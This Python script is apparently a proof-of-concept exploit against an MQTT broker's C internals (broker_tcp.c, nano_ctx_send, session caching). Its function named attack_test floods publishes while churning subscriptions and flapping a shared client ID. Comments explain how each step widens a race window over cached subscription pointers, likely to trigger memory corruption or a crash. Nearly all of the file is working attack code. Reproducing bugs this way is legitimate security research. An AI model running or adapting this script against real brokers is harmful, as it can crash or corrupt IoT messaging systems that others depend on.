import time
import random
import threading
import logging
from typing import List, Set

import paho.mqtt.client as mqtt
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes

BROKER_HOST = "127.0.0.1"
BROKER_PORT = 1883

TOPIC_ROOT = "loadtest"
CLIENTID_X = "X"

# Fixed topic: ensures subscriptions match; publishers keep sending to it
PUB_TOPIC = f"{TOPIC_ROOT}/grp/1/dev/2/telemetry/data"

# X's "anchor subscription" — never removed; always matches to keep the cache/send path busy
ANCHOR_FILTER = f"{TOPIC_ROOT}/grp/1/dev/2/telemetry/+"

# Shared subscriptions: many different share groups, but the same client subscribes =>
# lots of matches for the same publish topic (more likely to trigger broker_tcp.c niov>=8
# where info pointers are temporarily cached)
SHARE_GROUP_N = 48
SHARED_FILTERS = [f"$share/g{i}/{ANCHOR_FILTER}" for i in range(SHARE_GROUP_N)]

# "Noise subscriptions": do NOT match PUB_TOPIC (grp fixed to 999). Used to enlarge the list
# and increase free/alloc churn.
NOISE_N = 200
NOISE_FILTERS = [f"{TOPIC_ROOT}/grp/999/dev/999/telemetry/nope{i}/+" for i in range(NOISE_N)]

PUBLISH_QOS = 1
SUB_QOS = 1
SESSION_EXPIRY_SECONDS = 3600

DURATION_SEC = 120  # Recommended to run longer
FLOOD_PUBS = 8      # Number of publishers; increase if the machine can handle it
PAYLOAD_SIZE = 64

# Flapper cadence: keep X offline (cached) most of the time
FLAP_ONLINE_HOLD = 0.03   # How long to stay connected before disconnecting (shorter => more frequent swap/close)
FLAP_OFFLINE_GAP  = 0.08  # How long to stay offline (ensures a continuous window for cache traversal)

# Churn intensity: how many batches of operations to do each time it connects
CHURN_BATCH = 8
CHURN_UNSUB_EACH = 8
CHURN_SUB_EACH = 8

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s.%(msecs)03d [%(threadName)s] %(name)s %(levelname)s: %(message)s",
    datefmt="%H:%M:%S",
)

def mk_logger(name: str) -> logging.Logger:
    return logging.getLogger(name)

def new_client(client_id: str) -> mqtt.Client:
    c = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=client_id,
        protocol=mqtt.MQTTv5,
    )
    # High throughput: lift inflight/queue limits (otherwise local throttling happens if publishing too fast)
    try:
        c.max_inflight_messages_set(1000)
        c.max_queued_messages_set(0)  # 0 = unlimited
    except Exception:
        pass
    return c

def connect_v5(client: mqtt.Client, logger: logging.Logger, clean_start: bool, session_expiry: int):
    props = Properties(PacketTypes.CONNECT)
    props.SessionExpiryInterval = session_expiry
    logger.info("CONNECT -> clean_start=%s, SessionExpiryInterval=%s", int(clean_start), session_expiry)
    client.connect(
        BROKER_HOST, BROKER_PORT, keepalive=30,
        clean_start=clean_start, properties=props
    )

def disconnect_keep_session_v5(client: mqtt.Client, logger: logging.Logger, session_expiry: int):
    props = Properties(PacketTypes.DISCONNECT)
    props.SessionExpiryInterval = session_expiry
    logger.info("DISCONNECT (keep session) -> SessionExpiryInterval=%s", session_expiry)
    try:
        client.disconnect(properties=props)
    except TypeError:
        client.disconnect()

def wait_event(ev: threading.Event, sec: float) -> bool:
    return ev.wait(sec)

def subscribe_bulk(c: mqtt.Client, logger: logging.Logger, filters: List[str], qos: int, chunk: int = 20):
    for i in range(0, len(filters), chunk):
        part = filters[i:i+chunk]
        pairs = [(t, qos) for t in part]
        logger.info("SUBSCRIBE bulk: %d topics", len(pairs))
        c.subscribe(pairs)

def unsubscribe_bulk(c: mqtt.Client, logger: logging.Logger, filters: List[str], chunk: int = 20):
    for i in range(0, len(filters), chunk):
        part = filters[i:i+chunk]
        logger.info("UNSUBSCRIBE bulk: %d topics", len(part))
        c.unsubscribe(part)

def seed_big_session(stop: threading.Event):
    """
    1) Clear any old session
    2) Build a large subinfol: NOISE + ANCHOR + lots of SHARED
    3) Disconnect while keeping the session => cache=1
    """
    log = mk_logger("SEED")

    # Clear old session
    ev = threading.Event()
    c0 = new_client(CLIENTID_X)
    def on_c0_connect(cl, userdata, flags, reason_code, properties):
        ev.set()
    c0.on_connect = on_c0_connect
    c0.loop_start()
    connect_v5(c0, log, clean_start=True, session_expiry=0)
    wait_event(ev, 3)
    disconnect_keep_session_v5(c0, log, session_expiry=0)
    time.sleep(0.1)
    c0.loop_stop()

    if stop.is_set():
        return

    # Build large subscriptions
    ev2 = threading.Event()
    c = new_client(CLIENTID_X)
    def on_connect(cl, userdata, flags, reason_code, properties):
        log.info("connected: reason=%s session_present=%s", reason_code, bool(getattr(flags, "session_present", 0)))
        ev2.set()

    c.on_connect = on_connect
    c.loop_start()
    connect_v5(c, log, clean_start=False, session_expiry=SESSION_EXPIRY_SECONDS)
    if not wait_event(ev2, 5):
        log.error("seed connect timeout")
        c.loop_stop()
        return

    # NOISE first (enlarge the list; churn will free/alloc these a lot)
    subscribe_bulk(c, log, NOISE_FILTERS, SUB_QOS, chunk=25)
    # Then the anchor (always matches; ensures continuous send/cache decisions)
    subscribe_bulk(c, log, [ANCHOR_FILTER], SUB_QOS, chunk=1)
    # Finally shared (many matches; more likely to hit broker_tcp.c niov>=8 caching info pointers)
    subscribe_bulk(c, log, SHARED_FILTERS, SUB_QOS, chunk=16)

    # Disconnect but keep session => enter cache=1
    disconnect_keep_session_v5(c, log, session_expiry=SESSION_EXPIRY_SECONDS)
    time.sleep(0.2)
    c.loop_stop()
    log.info("seed done: session cached, large subinfol installed")

def flood_publisher_worker(idx: int, stop: threading.Event, counter: List[int]):
    log = mk_logger(f"FLOOD[{idx}]")
    ev = threading.Event()
    cid = f"FLOOD_{idx}_{random.randint(1000,9999)}"
    c = new_client(cid)

    def on_connect(cl, userdata, flags, reason_code, properties):
        log.info("connected: reason=%s", reason_code)
        ev.set()

    c.on_connect = on_connect
    c.loop_start()
    connect_v5(c, log, clean_start=True, session_expiry=0)
    if not wait_event(ev, 5):
        log.error("connect timeout")
        try:
            c.loop_stop()
        except Exception:
            pass
        return

    payload = b"A" * PAYLOAD_SIZE
    sent = 0
    while not stop.is_set():
        # Don't wait for PUBACK; try to saturate the broker's send/cache path
        c.publish(PUB_TOPIC, payload=payload, qos=PUBLISH_QOS, retain=False)
        sent += 1
        if sent % 500000 == 0:
            log.info("sent=%d", sent)

    counter[idx] = sent
    try:
        c.disconnect()
        time.sleep(0.05)
        c.loop_stop()
    except Exception:
        pass
    log.info("exit: sent=%d", sent)

def churn_worker(stop: threading.Event):
    """
    Continuously SUB/UNSUB with clientID=X. Key points:
    - Each time it connects, do a batch of UNSUB (free nodes) + SUB (allocate new nodes)
    - Touch both SHARED_FILTERS and NOISE_FILTERS to create heavy free/alloc churn
    """
    log = mk_logger("CHURN")
    active_noise: Set[str] = set(NOISE_FILTERS)  # Assume everything is present after seeding
    active_shared: Set[str] = set(SHARED_FILTERS)

    while not stop.is_set():
        ev = threading.Event()
        c = new_client(CLIENTID_X)

        def on_connect(cl, userdata, flags, reason_code, properties):
            log.info("connected: reason=%s session_present=%s", reason_code, bool(getattr(flags, "session_present", 0)))
            ev.set()

        c.on_connect = on_connect
        c.loop_start()
        connect_v5(c, log, clean_start=False, session_expiry=SESSION_EXPIRY_SECONDS)

        if not wait_event(ev, 3):
            # Might lose to flapper contention/collision; just try next round
            try:
                c.loop_stop()
            except Exception:
                pass
            continue

        # Make as many changes as possible while connected (don't wait for acks)
        for _ in range(CHURN_BATCH):
            if stop.is_set():
                break

            # UNSUB a batch of shared (free matching-sub nodes; more likely to affect broker_tcp traversal/cached pointers)
            if active_shared:
                victims = random.sample(list(active_shared), k=min(CHURN_UNSUB_EACH, len(active_shared)))
                # It's OK if we temporarily remove all shared subs here because ANCHOR_FILTER still guarantees matches.
                c.unsubscribe(victims)
                for v in victims:
                    active_shared.discard(v)

            # UNSUB a batch of noise (free noise nodes)
            if active_noise:
                victims = random.sample(list(active_noise), k=min(CHURN_UNSUB_EACH, len(active_noise)))
                c.unsubscribe(victims)
                for v in victims:
                    active_noise.discard(v)

            # SUB back a batch of shared/noise (allocate nodes again)
            add_shared = random.sample(SHARED_FILTERS, k=CHURN_SUB_EACH)
            add_noise  = random.sample(NOISE_FILTERS,  k=CHURN_SUB_EACH)
            c.subscribe([(t, SUB_QOS) for t in add_shared])
            c.subscribe([(t, SUB_QOS) for t in add_noise])
            active_shared.update(add_shared)
            active_noise.update(add_noise)

            # Re-SUB the anchor to try to push the "matching subscription" toward the tail
            # (lengthening the traversal time window)
            c.subscribe([(ANCHOR_FILTER, SUB_QOS)])

        disconnect_keep_session_v5(c, log, session_expiry=SESSION_EXPIRY_SECONDS)
        time.sleep(0.05)
        try:
            c.loop_stop()
        except Exception:
            pass

        # Stay offline briefly to lengthen the cache=1 window, giving nano_ctx_send(cache=1) more time to run
        time.sleep(0.05)

def flapper_worker(stop: threading.Event):
    """
    Another clientID=X that repeatedly triggers:
    - clean_start=0 => session resume/swap (nano_pipe_start swapping)
    - clean_start=1 => takeover/close/free branches more often
    Key: disconnect quickly each time so X returns to cache=1 most of the time.
    """
    log = mk_logger("FLAP")
    i = 0
    while not stop.is_set():
        clean_start = (i % 5 == 4)  # 4x resume + 1x takeover
        i += 1

        ev = threading.Event()
        c = new_client(CLIENTID_X)

        def on_connect(cl, userdata, flags, reason_code, properties):
            log.info("[%d] connected: reason=%s session_present=%s clean_start=%d",
                     i, reason_code, bool(getattr(flags, "session_present", 0)), int(clean_start))
            ev.set()

        c.on_connect = on_connect
        c.loop_start()
        connect_v5(c, log, clean_start=clean_start, session_expiry=SESSION_EXPIRY_SECONDS)

        if wait_event(ev, 2):
            time.sleep(FLAP_ONLINE_HOLD)
            disconnect_keep_session_v5(c, log, session_expiry=SESSION_EXPIRY_SECONDS)

        time.sleep(0.05)
        try:
            c.loop_stop()
        except Exception:
            pass

        time.sleep(FLAP_OFFLINE_GAP)

def attack_test():
    stop = threading.Event()

    # 1) Seed once: enlarge subinfol and cache the session
    seed_big_session(stop)

    # 2) Start flood publishers
    pub_counts = [0] * FLOOD_PUBS
    pubs = []
    for i in range(FLOOD_PUBS):
        t = threading.Thread(
            target=flood_publisher_worker,
            name=f"FloodPub-{i}",
            args=(i, stop, pub_counts),
            daemon=True,
        )
        t.start()
        pubs.append(t)

    # 3) Start churn + flapper (same ClientID=X)
    t_churn = threading.Thread(target=churn_worker, name="ChurnSubUnsub", args=(stop,), daemon=True)
    t_flap  = threading.Thread(target=flapper_worker, name="SessionFlapper", args=(stop,), daemon=True)
    t_churn.start()
    t_flap.start()

    # 4) Run for a fixed duration
    time.sleep(DURATION_SEC)
    stop.set()

    # Teardown
    for t in pubs:
        t.join(timeout=2)

    mk_logger("MAIN").info("done. publishers sent=%s", pub_counts)